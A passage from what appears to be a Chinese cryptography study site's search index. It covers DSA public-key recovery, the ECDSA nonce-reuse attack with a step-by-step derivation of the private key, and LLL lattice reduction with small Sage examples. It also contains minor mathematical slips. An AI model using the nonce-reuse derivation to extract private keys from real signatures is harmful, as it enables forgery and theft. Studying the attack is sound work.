\\\\ xr &amp;\\equiv sk - H(m) \\bmod q \\\\ x &amp;\\equiv r^{-1}(sk - H(m)) \\bmod q \\\\ y &amp;= g^x \\bmod p = g^{r^{-1}(sk - H(m))+nq} \\bmod p, n \\in Z \\\\ y &amp;= g^{r^{-1}sk}g^{-r^{-1}H(m)+nq} \\bmod p \\end{align}\\] <p>\u200b\u6b64\u65f6\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u65e0\u6cd5\u200b\u4ece\u200b \\(r\\) \u200b\u63a8\u65ad\u51fa\u200b \\(g^k \\bmod p\\) \u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u4e2d\u95f4\u200b\u5dee\u200b\u4e86\u200b \\(q\\) \u200b\u7684\u200b\u6574\u6570\u500d\u200b\u3002\u200b\u540e\u9762\u200b\u7684\u200b \\(g^{nq} \\bmod p\\) \u200b\u4e5f\u200b\u65e0\u6cd5\u200b\u8ba1\u7b97\u200b\u3002</p> <p>\u200b\u66f4\u52a0\u200b\u5b8c\u6574\u200b\u7684\u200b\u8ba8\u8bba\u200b\u53ef\u4ee5\u200b\u89c1\u200b Can we recover public key from DSA signatures as we can from ECDSA?\u3002</p>"},{"location":"cryptography/ecdsa.html#nonce-reuse-attack","title":"Nonce Reuse Attack","text":"<p>\u200b\u5728\u200b\u751f\u6210\u200b ECDSA \u200b\u7b7e\u540d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6ce8\u610f\u200b\u4e0d\u80fd\u200b\u7528\u200b\u56fa\u5b9a\u200b\u7684\u200b nonce\uff08\\(k\\)\uff09\uff0c\u200b\u5426\u5219\u200b\u4f1a\u200b\u88ab\u200b\u653b\u51fb\u200b\u3002\u200b\u5047\u5982\u200b\u653b\u51fb\u8005\u200b\u7528\u200b\u4e00\u5bf9\u200b ECDSA key pair \u200b\u5bf9\u200b\u4e0d\u540c\u200b\u7684\u200b\u4e24\u4e2a\u200b\u6d88\u606f\u200b \\(m_1\\) \u200b\u548c\u200b \\(m_2\\) \u200b\u5206\u522b\u200b\u505a\u200b\u4e86\u200b\u4e00\u6b21\u200b\u7b7e\u540d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u91c7\u7528\u200b\u4e86\u200b\u76f8\u540c\u200b\u7684\u200b nonce\uff0c\u200b\u90a3\u4e48\u200b\uff1a</p> <p>\u200b\u4e24\u6b21\u200b\u7b7e\u540d\u200b\u7684\u200b nonce \\(k\\) \u200b\u76f8\u7b49\u200b\uff0c\u200b\u56e0\u6b64\u200b \\(x_1\\) \u200b\u76f8\u7b49\u200b\uff0c\\(r\\) \u200b\u4e5f\u200b\u76f8\u7b49\u200b\uff0c\u200b\u53ea\u6709\u200b \\(s\\) \u200b\u4e0d\u540c\u200b\uff1a</p> \\[\\begin{align} s_1 &amp;= k^{-1}(z_1 + rd_A) \\bmod n \\\\ s_2 &amp;= k^{-1}(z_2 + rd_A) \\bmod n \\end{align}\\] <p>\u200b\u7b7e\u540d\u200b\u662f\u200b\u516c\u5f00\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b \\(r\\)\u3001\\(s_1\\) \u200b\u548c\u200b \\(s_2\\) \u200b\u662f\u200b\u653b\u51fb\u8005\u200b\u5df2\u77e5\u200b\u7684\u200b\u3002\u200b\u6b64\u5916\u200b\u6d88\u606f\u200b \\(m_1\\) \u200b\u548c\u200b \\(m_2\\) \u200b\u4e5f\u200b\u662f\u200b\u5df2\u77e5\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u6c42\u200b\u51fa\u200b \\(z_1\\) \u200b\u548c\u200b \\(z_2\\)\u3002\u200b\u73b0\u5728\u200b\u5c1d\u8bd5\u200b\u6c42\u89e3\u200b \\(d_A\\)\uff1a</p> \\[\\begin{align} s_1 &amp;= k^{-1}(z_1 + rd_A) \\bmod n \\\\ s_2 &amp;= k^{-1}(z_2 + rd_A) \\bmod n \\\\ k &amp;= s_1^{-1}(z_1 + rd_A) \\bmod n \\\\ k &amp;= s_2^{-1}(z_2 + rd_A) \\bmod n \\\\ s_1^{-1}(z_1 + rd_A) &amp;= s_2^{-1}(z_2 + rd_A) \\bmod n \\\\ (s_1^{-1} - s_2^{-1})rd_A &amp;= s_2^{-1}z_2 - s_1^{-1}z_1 \\bmod n \\\\ d_A &amp;= r^{-1}(s_1^{-1} - s_2^{-1})^{-1}(s_2^{-1}z_2 - s_1^{-1}z_1) \\bmod n \\end{align}\\] <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u628a\u200b\u79c1\u94a5\u200b \\(d_A\\) \u200b\u6c42\u200b\u4e86\u200b\u51fa\u6765\u200b\u3002</p>"},{"location":"cryptography/lll.html","title":"LLL \u200b\u683c\u57fa\u200b\u89c4\u7ea6\u200b\u7b97\u6cd5","text":"<p>LLL\uff08Lenstra\u2013Lenstra\u2013Lov\u00e1sz\uff09\u200b\u683c\u57fa\u200b\u89c4\u7ea6\u200b\u7b97\u6cd5\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u683c\u200b\uff08lattice\uff09\u200b\u7684\u200b\u4e00\u7ec4\u200b\u57fa\u200b\uff08basis\uff09\u200b\u7684\u200b\u89c4\u7ea6\u200b\uff0c\u200b\u89c4\u7ea6\u200b\u540e\u200b\u5f97\u5230\u200b\u4e86\u200b\u65b0\u200b\u7684\u200b\u4e00\u7ec4\u200b\u57fa\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8fd9\u4e9b\u200b\u57fa\u200b\u5411\u91cf\u200b\u7684\u200b\u5927\u5c0f\u200b\u6ee1\u8db3\u200b\u4e0d\u7b49\u5f0f\u200b\u3002</p>"},{"location":"cryptography/lll.html#_1","title":"\u683c","text":"<p>\u200b\u9996\u5148\u200b\u5b9a\u4e49\u200b\u4ec0\u4e48\u200b\u662f\u200b\u683c\u200b\uff08lattice\uff09\uff1a</p> <p>\u200b\u7ed9\u5b9a\u200b \\(\\mathbb{R}^n\\) \u200b\u4e0a\u200b\u7684\u200b \\(n\\) \u200b\u4e2a\u200b\u5411\u91cf\u200b \\(\\{b_1, b_2, \\cdots b_n\\}\\)\uff1a</p> \\[\\begin{align} b_1 &amp;= (a_{11}, a_{12}, \\cdots, a_{1n}) \\\\ b_2 &amp;= (a_{21}, a_{22}, \\cdots, a_{2n}) \\\\ &amp;\\vdots \\\\ b_n &amp;= (a_{n1}, a_{n2}, \\cdots, a_{nn}) \\\\ \\end{align}\\] <p>\u200b\u5c06\u200b\u8fd9\u4e9b\u200b\u57fa\u200b\u5411\u91cf\u200b\u4ee5\u6574\u200b\u7cfb\u6570\u200b\u7ebf\u6027\u7ec4\u5408\u200b\u5f97\u5230\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u5c31\u662f\u200b\u683c\u200b\uff1a</p> \\[ L = \\{\\sum_i^d r_ib_i \\vert r_i \\in \\mathbb{Z}\\} \\] <p>\u200b\u4f8b\u5982\u200b \\(\\mathbb{Z}^2\\) \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u4ee5\u200b \\((1, 0), (0, 1)\\) \u200b\u4e3a\u57fa\u200b\u6784\u6210\u200b\u7684\u200b\u683c\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u4ee5\u200b \\((1, 0), (1, 1)\\) \u200b\u4e3a\u57fa\u200b\u6784\u6210\u200b\u7684\u200b\u683c\u200b\u3002</p>"},{"location":"cryptography/lll.html#_2","title":"\u683c\u57fa\u200b\u89c4\u7ea6","text":"<p>\u200b\u683c\u200b\u89c4\u7ea6\u200b\u8981\u200b\u5b9e\u73b0\u200b\u7684\u200b\u4e8b\u60c5\u200b\u662f\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u7ed9\u5b9a\u200b\u7684\u200b\u683c\u200b L\uff0c\u200b\u5373\u200b\u5df2\u77e5\u200b\uff1a</p> \\[ L = \\{\\sum_i^d r_ib_i \\vert r_i \\in \\mathbb{Z}\\} \\] <p>\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u4e00\u7ec4\u200b\u65b0\u200b\u7684\u200b\u4e00\u7ec4\u200b\u57fa\u200b \\(\\{b_1', b_2', \\cdots, b_n'\\}\\)\uff0c\u200b\u6ee1\u8db3\u200b\uff1a</p> \\[ L = \\{\\sum_i^d r_ib_i' \\vert r_i \\in \\mathbb{Z}\\} \\] <p>\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e24\u7ec4\u200b\u57fa\u5728\u200b\u6784\u6210\u200b\u683c\u200b L \u200b\u4e0a\u200b\u662f\u200b\u7b49\u4ef7\u200b\u7684\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u89c4\u7ea6\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u4f1a\u200b\u7ed9\u200b\u65b0\u200b\u7684\u200b\u4e00\u7ec4\u200b\u57fa\u200b\u6dfb\u52a0\u200b\u7ea6\u675f\u200b\uff0c\u200b\u4ece\u800c\u200b\u5f97\u5230\u200b\u201c\u200b\u66f4\u597d\u200b\u201d\u200b\u7684\u200b\u4e00\u7ec4\u200b\u57fa\u200b\u3002</p>"},{"location":"cryptography/lll.html#lll_1","title":"LLL \u200b\u683c\u57fa\u200b\u89c4\u7ea6\u200b\u7b97\u6cd5","text":"<p>LLL \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u683c\u57fa\u200b\u89c4\u7ea6\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u5bf9\u4e8e\u200b \\(L \\subset \\mathbb{Z}^n\\) \u200b\u7684\u200b\u4e00\u7ec4\u200b\u57fa\u200b\uff0c\u200b\u8fdb\u884c\u200b\u89c4\u7ea6\u200b\u540e\u200b\u5f97\u5230\u200b\u7684\u200b\u57fa\u200b \\(\\{b_1, b_2, \\cdots b_n\\}\\) \u200b\u6ee1\u8db3\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u6027\u8d28\u200b\uff1a</p> \\[ |b_1| \\le 2^{(n-1)/4} |\\mathrm{det}(L)|^{1/n} \\] <p>\u200b\u8fd9\u200b\u610f\u5473\u7740\u200b\u89c4\u7ea6\u200b\u540e\u200b\u5f97\u5230\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u57fa\u7684\u200b\u5927\u5c0f\u200b\u662f\u200b\u6709\u754c\u200b\u7684\u200b\uff0c\u200b\u516c\u5f0f\u200b\u4e2d\u200b \\(\\mathrm{det}(L)\\) \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u628a\u200b\u57fa\u200b\u5411\u91cf\u200b\u62fc\u63a5\u200b\u6210\u200b\u7684\u200b\u77e9\u5f62\u200b\u7684\u200b\u7279\u5f81\u503c\u200b\u3002</p> <p>LLL \u200b\u7b97\u6cd5\u200b\u8fd8\u4f1a\u200b\u5f97\u5230\u200b\u5176\u4ed6\u200b\u7684\u200b\u6027\u8d28\u200b\uff0c\u200b\u8be6\u89c1\u200b Wikipedia\u3002</p>"},{"location":"cryptography/lll.html#_3","title":"\u5e94\u7528","text":""},{"location":"cryptography/lll.html#_4","title":"\u5df2\u77e5\u200b\u6574\u200b\u7cfb\u6570\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u6839\u200b\uff0c\u200b\u6c42\u200b\u591a\u9879\u5f0f","text":"<p>\u200b\u5e94\u7528\u200b LLL \u200b\u53ef\u4ee5\u200b\u6c42\u89e3\u200b\u8fd9\u6837\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\uff1a\u200b\u5df2\u77e5\u200b\u6709\u200b\u4e00\u4e2a\u200b \\(n\\) \u200b\u6b21\u6574\u200b\u7cfb\u6570\u200b\u591a\u9879\u5f0f\u200b\u4ee5\u53ca\u200b\u5b83\u200b\u7684\u200b\u96f6\u70b9\u200b \\(r\\)\uff0c\u200b\u73b0\u5728\u200b\u8981\u6c42\u200b\u6574\u200b\u7cfb\u6570\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u5404\u9879\u200b\u7cfb\u6570\u200b\u7684\u200b\u591a\u5c11\u200b\u3002</p> <p>\u200b\u4f8b\u5b50\u200b\uff1a\u200b\u5df2\u77e5\u200b \\(r=1.6180339\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b 2 \u200b\u6b21\u200b\u6574\u6570\u200b\u591a\u9879\u5f0f\u200b \\(ax^2 + bx + c\\) \u200b\u7684\u200b\u96f6\u70b9\u200b\uff0c\u200b\u5373\u200b \\(ar^2 + br + c=0\\)\uff0c\u200b\u6c42\u200b \\(a\\) \\(b\\) \\(c\\)\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u5229\u7528\u200b LLL \u200b\u683c\u57fa\u200b\u89c4\u7ea6\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u9700\u8981\u200b\u6839\u636e\u200b\u9898\u76ee\u200b\u6761\u4ef6\u200b\u6784\u9020\u200b\u51fa\u200b\u4e00\u7ec4\u200b\u57fa\u200b \\(\\{b_1, b_2, b_3\\}\\)\uff1a</p> \\[\\begin{align} b_1 &amp;= (1, 0, Xr^2) \\\\ b_2 &amp;= (0, 1, Xr) \\\\ b_3 &amp;= (0, 0, X) \\\\ \\end{align}\\] <p>\u200b\u5176\u4e2d\u200b \\(X\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u6574\u6570\u200b\uff0c\u200b\u56e0\u4e3a\u200b LLL \u200b\u7b97\u6cd5\u200b\u8981\u6c42\u200b \\(L \\subset \\mathbb{Z}^n\\)\uff0c\u200b\u6240\u4ee5\u200b\u4e0a\u5f0f\u200b\u4e2d\u200b\u7684\u200b \\(Xr^2\\) \u200b\u548c\u200b \\(Xr\\) \u200b\u4e24\u9879\u200b\u90fd\u200b\u9700\u8981\u200b\u53d6\u6574\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u4e3a\u4e86\u200b\u4e0b\u9762\u200b\u516c\u5f0f\u200b\u63a8\u5bfc\u200b\u7684\u200b\u65b9\u4fbf\u200b\uff0c\u200b\u6682\u65f6\u200b\u7701\u7565\u200b\u4e86\u200b\u3002</p> <p>\u200b\u5047\u5982\u200b\u5bf9\u200b\u4e0a\u9762\u200b\u7684\u200b\u57fa\u200b\u8fdb\u884c\u200b LLL \u200b\u683c\u57fa\u200b\u89c4\u7ea6\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u5e94\u8be5\u200b\u4f1a\u200b\u5f97\u5230\u200b\u4e00\u7ec4\u200b\u65b0\u200b\u7684\u200b\u57fa\u200b \\(\\{b_1', b_2', b_3'\\}\\)\uff0c\u200b\u6ee1\u8db3\u200b\uff1a</p> \\[ |b_1'| \\le 2^{(n-1)/4} |\\mathrm{det}(L)|^{1/n} \\] <p>\u200b\u5176\u4e2d\u200b\uff1a</p> \\[ L = (b_1^T b_2^T b_3^T) = \\begin{pmatrix} 1 &amp; 0 &amp; 0 \\\\ 0 &amp; 1 &amp; 0 \\\\ Xr^2 &amp; Xr &amp; X \\end{pmatrix} \\] <p>\u200b\u8ba1\u7b97\u200b\u884c\u5217\u5f0f\u200b\u53ef\u200b\u5f97\u200b \\(\\mathrm{det}(L)=X\\)\uff0c\u200b\u4ee3\u5165\u200b \\(n=3\\) \u200b\u5230\u200b\u4e0a\u5f0f\u200b\uff0c\u200b\u53ef\u200b\u5f97\u200b \\(|b_1'| \\le 2^{1/2} |X|^{1/3}\\)\u3002</p> <p>\u200b\u53c8\u200b\u56e0\u4e3a\u200b\u4e24\u7ec4\u200b\u57fa\u662f\u200b\u7b49\u4ef7\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b \\(b_1'\\) \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u200b \\(\\{b_1, b_2, b_3\\}\\) \u200b\u7ebf\u6027\u7ec4\u5408\u200b\u5f97\u5230\u200b\uff0c\u200b\u4e14\u200b\u7cfb\u6570\u200b \\(A\\) \\(B\\) \\(C\\) \u200b\u662f\u200b\u6574\u6570\u200b\uff1a</p> \\[\\begin{align} b_1' &amp;= Ab_1 + Bb_2 + Cb_3 \\\\ &amp;= (A, 0, AXr^2) + (0, B, BXr) + (0, 0, CX) \\\\ &amp;= (A, 0, XAr^2) + (0, B, XBr) + (0, 0, XC) \\\\ &amp;= (A, B, X(Ar^2 + Br + C)) \\end{align}\\] <p>\u200b\u56e0\u6b64\u200b \\(|b_1'| = \\sqrt{A^2+B^2+(X(Ar^2+Br+C))^2} \\le 2^{1/2} X^{1/3}\\)\uff0c\u200b\u7531\u4e8e\u200b \\(X\\) \u200b\u662f\u200b\u81ea\u5df1\u200b\u9009\u5b9a\u200b\u7684\u200b\u4efb\u610f\u200b\u6574\u6570\u200b\uff0c\u200b\u5f53\u200b X \u200b\u53d6\u200b\u8db3\u591f\u200b\u5927\u65f6\u200b\uff0c\u200b\u53ea\u6709\u200b\u5f53\u200b \\(Ar^2+Br+C \\approx 0\\) \u200b\u65f6\u200b\uff0c\u200b\u4e0a\u200b\u5f0f\u200b\u624d\u80fd\u200b\u6ee1\u8db3\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u627e\u5230\u200b\u4e86\u200b\u4ee5\u200b \\(r\\) \u200b\u4e3a\u200b\u96f6\u70b9\u200b\u7684\u200b\u6574\u200b\u7cfb\u6570\u200b\u591a\u9879\u5f0f\u200b\u3002</p> <p>\u200b\u6b64\u65f6\u200b \\(A\\) \u200b\u548c\u200b \\(B\\) \u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4ece\u200b\u5f97\u5230\u200b\u7684\u200b \\(b_1'\\) \u200b\u57fa\u200b\u5411\u91cf\u200b\u4e2d\u200b\u53d6\u51fa\u200b\uff0c\\(C\\) \u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b \\(C=-Ar^2-Br\\) \u200b\u8ba1\u7b97\u200b\u5f97\u51fa\u200b\u3002</p> <p>\u200b\u5b9e\u9645\u4e0a\u200b\u4f7f\u7528\u200b LLL \u200b\u7b97\u6cd5\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u57fa\u7684\u200b\u4e2a\u6570\u200b\u53ef\u4ee5\u200b\u5c11\u4e8e\u200b\u7ef4\u6570\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5bf9\u4e8e\u200b\u4e0a\u9762\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6784\u9020\u200b\u51fa\u200b\u5982\u4e0b\u200b\u4e00\u7ec4\u200b\u57fa\u200b\uff1a</p> \\[\\begin{align} b_1 &amp;= (1, 0, 0, Xr^2) \\\\ b_2 &amp;= (0, 1, 0, Xr) \\\\ b_3 &amp;= (0, 0, 1, X) \\\\ \\end{align}\\] <p>\u200b\u6b64\u65f6\u200b\u7ecf\u8fc7\u200b LLL \u200b\u89c4\u7ea6\u200b\u540e\u200b\u5f97\u5230\u200b\u7684\u200b \\(b_1'=(A, B, C, *)\\)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u76f4\u63a5\u200b\u5f97\u5230\u200b\u4e86\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u6240\u6709\u200b\u7cfb\u6570\u200b\u3002</p> <p>\u200b\u7528\u200b sage \u200b\u5b9e\u73b0\u200b\u4e0a\u9762\u200b\u7684\u200b\u7b97\u6cd5\u200b\uff1a</p> <pre><code># parameters\nr = 1.618\ndegree = 2\nX = 10000\n\n# build lattice matrix\nmatrix = []\n\nfor i in range(degree + 1):\n    matrix.append(\n        [int(i == j) for j in range(degree + 1)] + [round(X * (r ** (degree - i)))]\n    )\n\n# compute first basis vector after LLL reduction\nm = Matrix(ZZ, matrix)\nans = m.LLL()[0]\n\n# recover polynomial\nexpr = 0\nx = var(\"x\")\nfor i in range(degree + 1):\n    expr = expr + ans[i] * (x ** (degree - i))\n\n# prints \"-x^2 + x + 1\"\nprint(expr)\n</code></pre>"},{"location":"cryptography/lll.html#_5","title":"\u627e\u5230\u200b\u8fd1\u4f3c\u200b\u7ed9\u5b9a\u200b\u5b9e\u6570\u200b\u7684\u200b\u6709\u7406\u6570","text":"<p>\u200b\u4f7f\u7528\u200b LLL \u200b\u53ef\u4ee5\u200b\u9488\u5bf9\u200b\u7ed9\u5b9a\u200b\u5b9e\u6570\u200b \\(a\\)\uff0c\u200b\u627e\u5230\u200b\u6574\u6570\u200b \\(x\\) \u200b\u548c\u200b \\(y\\)\uff0c\u200b\u4f7f\u5f97\u200b \\(x/y \\approx a\\)\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4f7f\u7528\u200b LLL \u200b\u7b97\u6cd5\u200b\u89e3\u51b3\u200b\uff0c\u200b\u9700\u8981\u200b\u628a\u200b\u7b49\u5f0f\u200b\u7684\u200b\u5404\u9879\u200b\u53d8\u6210\u200b\u6574\u6570\u200b\uff1a</p> \\[\\begin{align} \\frac{x}{y} &amp;= a \\\\ x - ay &amp;= 0 \\\\ 10^px - \\mathrm{round}(10^pa)y &amp;= 0 \\\\ \\end{align}\\] <p>\u200b\u4e58\u4ee5\u200b \\(10^p\\) \u200b\u540e\u53d6\u200b\u6574\u662f\u200b\u4e3a\u4e86\u200b\u5728\u200b\u53d6\u6574\u200b\u4e4b\u524d\u200b\u80fd\u591f\u200b\u4fdd\u7559\u200b \\(a\\) \u200b\u7684\u200b \\(p\\) \u200b\u4f4d\u200b\u5c0f\u6570\u200b\u90e8\u5206\u200b\uff0c\u200b\u4e5f\u200b\u65b9\u4fbf\u200b\u540e\u7eed\u200b LLL \u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u5c3d\u91cf\u200b\u8ba9\u200b\u7b49\u5f0f\u200b\u53f3\u8fb9\u200b\u7b49\u4e8e\u200b 0\u3002\u200b\u5728\u200b\u6b64\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u6784\u9020\u200b\u51fa\u200b\u4e00\u7ec4\u200b\u57fa\u200b\uff1a</p> \\[\\begin{align} b_1 &amp;= (1, 0, 10^p) \\\\ b_2 &amp;= (0, 1, -\\mathrm{round}(10^pa)) \\end{align}\\] <p>LLL \u200b\u89c4\u7ea6\u200b\u540e\u200b\u5f97\u5230\u200b \\(b_1'=(x, y, 10^px -\\mathrm{round}(10^pa)y)\\)\u3002</p> <p>\u200b\u7528\u200b Sage \u200b\u5b9e\u73b0\u200b\uff1a</p> <pre><code># parameters\na = 3.1415926535\np = 10\n\n# construct matrix\nm = 10**p\nmatrix = Matrix(\n    ZZ,\n    [[1, 0, m], [0, 1, round(-a * m)]],\n)\n\n# extract answer after LLL\nans = matrix.LLL()\nnumerator = ans[0][0]\ndenominator = ans[0][1]\n\n# print \"-104348 / -33215 = 3.141592653921421\"\nprint(f\"{numerator} / {denominator} = {float(numerator) / denominator}\")\n</code></pre> <p>\u200b\u66f4\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b\u516c\u5f0f\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5728\u200b\u903c\u8fd1\u200b \\(x/y \\approx a\\) \u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u8fd8\u8981\u200b\u8ba9\u200b \\(y\\) \u200b\u7684\u200b\u7edd\u5bf9\u503c\u200b\u5c3d\u91cf\u200b\u5c0f\u200b\uff0c\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u8fd9\u6837\u200b\u8bbe\u8ba1\u200b\uff1a</p> \\[\\begin{align} b_1 &amp;= (1, 0, 10^p, 10^q, 0) \\\\ b_2 &amp;= (0, 1, -\\mathrm{round}(10^pa), 0, 10^q) \\end{align}\\] <p>LLL \u200b\u89c4\u7ea6\u200b\u540e\u200b\u5f97\u5230\u200b \\(b_1'=(x, y, 10^px -\\mathrm{round}(10^pa)y, 10^qx, 10^qy)\\)\u3002\u200b\u5f53\u200b \\(p=10, q=5\\) \u200b\u65f6\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u662f\u200b \\(355 / 113 = 3.1415929203539825\\)\u3002</p>"},{"location":"cryptography/lll.html#coppersmith","title":"Coppersmith \u200b\u7b97\u6cd5\u200b\u6c42\u89e3\u200b\u540c\u4f59\u200b\u591a\u9879\u5f0f\u200b\u65b9\u7a0b","text":"<p>Coppersmith \u200b\u7b97\u6cd5\u200b\u5229\u7528\u200b LLL \u200b\u7b97\u6cd5\u200b\u6765\u6c42\u200b\u7279\u5b9a\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u5728\u200b\u540c\u4f59\u200b\u610f\u4e49\u200b\u4e0b\u200b\u7684\u200b\u6574\u6570\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u6839\u200b\uff1a</p> \\[ f(x) = 0 \\quad \\pmod n \\] <p>\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u540c\u4f59\u200b\uff0c\u200b\u4f8b\u5982\u200b\u8981\u89e3\u200b \\(f(x) = 0\\)\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b\u73b0\u6210\u200b\u7684\u200b\u8fed\u4ee3\u6cd5\u200b\u6765\u200b\u5bfb\u627e\u200b\u65b9\u7a0b\u200b\u7684\u200b\u89e3\u200b\u3002\u200b\u4f46\u200b\u6b64\u5904\u200b\u591a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u540c\u4f59\u200b\uff0c\u200b\u5c31\u200b\u65e0\u6cd5\u200b\u76f4\u63a5\u200b\u7528\u200b\u8fed\u4ee3\u6cd5\u200b\u6c42\u89e3\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b Coppersmith \u200b\u7b97\u6cd5\u200b\u7684\u200b\u601d\u8def\u200b\u662f\u200b\uff0c\u200b\u628a\u200b\u672a\u77e5\u200b\u95ee\u9898\u200b\u53d8\u6210\u200b\u5df2\u77e5\u200b\u7684\u200b\u95ee\u9898\u200b\u6765\u200b\u6c42\u89e3\u200b\uff1a\u200b\u5b58\u5728\u200b \\(x_0\\) \u200b\u4f7f\u5f97\u200b \\(f(x_0)=0 \\pmod n\\)\uff0c\u200b\u5982\u679c\u200b \\(x_0\\) \u200b\u6bd4\u8f83\u200b\u5c0f\u200b\uff0c\\(n\\) \u200b\u6bd4\u8f83\u200b\u5927\u200b\uff0c\u200b\u80fd\u5426\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u591a\u9879\u5f0f\u200b \\(g(x)\\) \u200b\u4f7f\u5f97\u200b \\(g(x_0)=0\\)\uff0c\u200b\u5e76\u4e14\u200b\u8fd9\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u5404\u9879\u200b\u7cfb\u6570\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\uff0c\u200b\u5c0f\u5230\u200b\u5728\u200b \\(x\\) \u200b\u5904\u4e8e\u200b\u4e00\u5b9a\u200b\u8303\u56f4\u200b\u5185\u65f6\u200b\uff0c\\(g(x)\\) \u200b\u4e0d\u4f1a\u200b\u8d85\u51fa\u200b \\(n\\)\uff0c\u200b\u56e0\u4e3a\u200b\u6b64\u65f6\u200b\u6ca1\u6709\u200b\u540c\u4f59\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u7528\u200b\u8fed\u4ee3\u6cd5\u200b\u6765\u200b\u6c42\u89e3\u200b\u65b9\u7a0b\u200b\u3002</p> <p>\u200b\u6309\u7167\u200b\u8fd9\u4e2a\u200b\u601d\u8def\u200b\uff0cCoppersmith \u200b\u7b97\u6cd5\u200b\u5206\u4e3a\u200b\u4e24\u6b65\u200b\uff1a</p> <ol> <li>\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u591a\u9879\u5f0f\u200b \\(g(x)\\)\uff0c\u200b\u4f7f\u5f97\u200b \\(f(x) = 0 \\pmod n\\) \u200b\u65f6\u200b \\(g(x) = 0 \\pmod n\\) \u200b\u6210\u7acb\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8fd9\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u5404\u9879\u200b\u7cfb\u6570\u200b\u8f83\u200b\u5c0f\u200b</li> <li>\u200b\u4f7f\u7528\u200b\u8fed\u4ee3\u6cd5\u200b\u6c42\u89e3\u200b \\(g(x) = 0\\)\uff08\u200b\u4e0d\u200b\u8003\u8651\u200b \\(\\bmod n\\)\uff09\uff0c\u200b\u4ece\u800c\u200b\u5f97\u5230\u200b \\(f(x) = 0 \\pmod n\\) \u200b\u7684\u200b\u89e3\u200b</li> </ol> <p>\u200b\u6838\u5fc3\u200b\u95ee\u9898\u200b\u662f\u200b\u7b2c\u4e00\u6b65\u200b\uff0c\u200b\u600e\u4e48\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u7cfb\u6570\u200b\u66f4\u200b\u5c0f\u200b\u7684\u200b \\(g(x)\\)\uff1f\u200b\u7b54\u6848\u200b\u662f\u200b\u627e\u200b\u66f4\u200b\u9ad8\u200b\u6b21\u6570\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b\uff0c\u200b\u4f8b\u5982\u200b \\(f(x) = x^2+ax+b\\)\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b\uff1a</p> \\[\\begin{align} x^2+ax+b \\\\ (x^2+ax+b)x \\\\ (x^x+ax+b)^2 \\\\ (x^x+ax+b)^2x \\\\ \\end{align}\\] <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b \\(x_0\\) 